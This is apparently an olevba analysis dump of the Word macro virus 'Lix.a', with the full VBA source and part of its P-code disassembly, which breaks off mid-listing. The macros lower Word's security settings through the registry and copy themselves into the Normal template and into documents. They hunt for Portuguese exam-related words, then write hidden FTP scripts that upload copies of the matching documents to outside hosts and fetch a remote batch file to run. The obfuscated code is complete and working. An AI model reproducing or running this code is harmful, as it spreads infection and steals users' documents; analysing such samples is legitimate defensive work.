olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lix.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lix.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lix1.bas 
in file: Virus.MSWord.Lix.a - OLE stream: 'Macros/VBA/lix1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
On Error Resume Next
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Access" + Chr(86) + Chr(66) + Chr(79) + Chr(77)) = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 End Select
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
nm = "cdrom"
yesnor = False
yesdoc = False
Set nor = NormalTemplate.VBProject.VBComponents
Set doc = ActiveDocument.VBProject.VBComponents
nor.Remove VbComponent:=nor.Item("lix")
doc.Remove VbComponent:=doc.Item("lix")
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115)
dropfile = sv + c1 + "\" + nm + "." + "txt"

If Dir(sv + c1, vbDirectory) = "" Then MkDir (sv + c1)
If doc.Count > 0 Then
For i = 1 To doc.Count
If doc.Item(i).Name = "lix1" Then yesdoc = True
  Next
End If
For Each VbComponent In nor
     If VbComponent.Name = "lix1" Then yesnor = True
  Next
If yesnor = False And ActiveDocument.Saved Then
      doc("lix1").Export dropfile
          nor.import dropfile
          NormalTemplate.Save

          
End If
If yesdoc = False Then
      nor("lix1").Export dropfile
          doc.import dropfile
          ActiveDocument.Save
End If
Call c002
End Sub
Sub c002()
On Error Resume Next
mySearchString = "Pr" + Chr(111) + Chr(118) + Chr(97)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
If x < 6 Then
  mySearchString = Chr(97) + "v" + Chr(97) + "li" + Chr(97) + "çã" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
  mySearchString = "c" + Chr(111) + "p" + Chr(101) + "v" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
mySearchString = "c" + Chr(111) + "ncu" + Chr(114) + "s" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "xc" + Chr(101) + "t" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
    Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext, Name:="1"
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = ""
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
 sn = Left(ActiveDocument.Name, Len(ActiveDocument.Name) - 3) + "j" + Chr(112) + "g"
 s2 = ActiveDocument.Name
 src = ActiveDocument.FullName
 s1 = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)

  If x = 6 Then

         m1 = sv + c1 + "m1.bat"
         Open m1 For Output As #1
       Print #1, "copy " + Chr(34) + src + Chr(34) + "  " + Chr(34) + sv + c1 + sn + Chr(34) + " /y"
        Close #1
         Shell m1, vbHide
            Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r n" + Chr(111) + "vat" + Chr(111) + "  " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, "m" + Chr(112) + "ut " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
    sn = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
    Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -i -n -s:" + s1
    Print #1, "i" + Chr(102) + " ex" + Chr(105) + "s" + Chr(116) + " " + sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116) + " g" + Chr(111) + "t" + Chr(111) + " l" + Chr(105) + "x"
    Close #1
         Shell sn, vbHide
    End If
   ActiveDocument.Close

End Sub


Sub autoexit()
On Error Resume Next
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
Kill sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
s1 = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)
c11 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115)
s1s = sv + c1 + Chr(98) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)
sns = sv + c1 + Chr(98) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
sn = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
Set Search = Word.Application.FileSearch
Search.LookIn = "c:\" + c11: Search.SearchSubFolders = False: Search.FileName = Chr(42) + Chr(106) + Chr(112) + Chr(103): Search.Execute
   If Search.FoundFiles.Count > 0 Then
   
    Open sns For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -i -s:" + s1s
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "f" + Chr(116) + "p"
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + Chr(106) + Chr(112) + Chr(103)
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "b" + "a" + Chr(116)
    Print #1, ":l" + Chr(105) + "x"
    Print #1, sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "f" + Chr(116) + "p"
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + Chr(106) + Chr(112) + Chr(103)
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "b" + "a" + Chr(116)

    Close #1
    Open s1s For Output As #1
    Print #1, "o " + Chr(102) + "t" + Chr(112) + Chr(46) + Chr(104) + Chr(97) + Chr(116) + Chr(101); "-i" + Chr(110) + Chr(99) + Chr(46) + Chr(99) + "o" + Chr(109)
    Print #1, Chr(116) + Chr(101) + "s" + Chr(116) + Chr(101)
    Print #1, Chr(116) + Chr(101) + "s" + Chr(116) + Chr(101)
    Print #1, Chr(99) + Chr(100) + " l" + Chr(111) + "gf" + Chr(105) + "les"
    Print #1, "binary"
    Print #1, "m" + Chr(112) + "ut " + sv + c1 + Chr(42) + "." + Chr(106) + Chr(112) + Chr(103)
    Print #1, Chr(103) + Chr(101) + Chr(116) + " l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116) + " " + sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
   End If
   Select Case Application.Version
    Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Access" + Chr(86) + Chr(66) + Chr(79) + Chr(77)) = 1&
    Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    End Select

        Shell sns, vbHide

End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lix.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/lix1 - 14003 bytes
' Line #0:
' 	FuncDefn (Sub autoclose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld Application 
' 	MemLd Version 
' 	SelectCase 
' Line #3:
' 	LitStr 0x0004 "10.0"
' 	Case 
' 	CaseDone 
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0006 "Access"
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	LitStr 0x0003 "9.0"
' 	Case 
' 	CaseDone 
' Line #7:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #8:
' 	EndSelect 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #12:
' 	LitStr 0x0005 "cdrom"
' 	St nm 
' Line #13:
' 	LitVarSpecial (False)
' 	St yesnor 
' Line #14:
' 	LitVarSpecial (False)
' 	St yesdoc 
' Line #15:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set nor 
' Line #16:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set doc 
' Line #17:
' 	LitStr 0x0003 "lix"
' 	Ld nor 
' 	ArgsMemLd Item 0x0001 
' 	ParamNamed VbComponent 
' 	Ld nor 
' 	ArgsMemCall Remove 0x0001 
' Line #18:
' 	LitStr 0x0003 "lix"
' 	Ld doc 
' 	ArgsMemLd Item 0x0001 
' 	ParamNamed VbComponent 
' 	Ld doc 
' 	ArgsMemCall Remove 0x0001 
' Line #19:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sv 
' Line #20:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' Line #21:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld nm 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0003 "txt"
' 	Add 
' 	St dropfile 
' Line #22:
' Line #23:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #24:
' 	Ld doc 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Ld i 
' 	Ld doc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "lix1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St yesdoc 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld nor 
' 	ForEach 
' Line #30:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0004 "lix1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St yesnor 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Next 
' Line #32:
' 	Ld yesnor 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	And 
' 	IfBlock 
' Line #33:
' 	Ld dropfile 
' 	LitStr 0x0004 "lix1"
' 	ArgsLd doc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #34:
' 	Ld dropfile 
' 	Ld nor 
' 	ArgsMemCall import 0x0001 
' Line #35:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #36:
' Line #37:
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld yesdoc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	Ld dropfile 
' 	LitStr 0x0004 "lix1"
' 	ArgsLd nor 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #41:
' 	Ld dropfile 
' 	Ld doc 
' 	ArgsMemCall import 0x0001 
' Line #42:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	ArgsCall (Call) c002 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub c002())
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	LitStr 0x0002 "Pr"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #49:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #50:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #51:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #52:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #53:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #54:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #55:
' 	EndWith 
' Line #56:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "v"
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "li"
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "çã"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #58:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #59:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #60:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #61:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #62:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #63:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #64:
' 	EndWith 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #67:
' 	LitStr 0x0001 "c"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "v"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #68:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #69:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #70:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #71:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #72:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #73:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #74:
' 	EndWith 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #77:
' 	LitStr 0x0001 "c"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ncu"
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #78:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #79:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #80:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #81:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #82:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #83:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #84:
' 	EndWith 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #87:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "xc"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #88:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #89:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #90:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #92:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #93:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #94:
' 	EndWith 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	Ld wdGoToPage 
' 	ParamNamed What 
' 	Ld wdGoToNext 
' 	ParamNamed Which 
' 	LitStr 0x0001 "1"
' 	ParamNamed New 
' 	Ld Selection 
' 	ArgsMemCall If 0x0003 
' Line #97:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #98:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #99:
' 	LitStr 0x0000 ""
' 	MemStWith Then 
' Line #100:
' 	LitStr 0x0000 ""
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #101:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #102:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #103:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #104:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #105:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #106:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #107:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #108:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #109:
' 	EndWith 
' Line #110:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' Line #111:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sv 
' Line #112:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	St sn 
' Line #113:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St s2 
' Line #114:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St src 
' Line #115:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St s1 
' Line #116:
' Line #117:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #118:
' Line #119:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0006 "m1.bat"
' 	Add 
' 	St m1 
' Line #120:
' 	Ld m1 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "copy "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld src 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "  "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	Ld sn 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 " /y"
' 	Add 
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #123:
' 	Ld m1 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #124:
' 	Ld s1 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "o "
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "dr"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
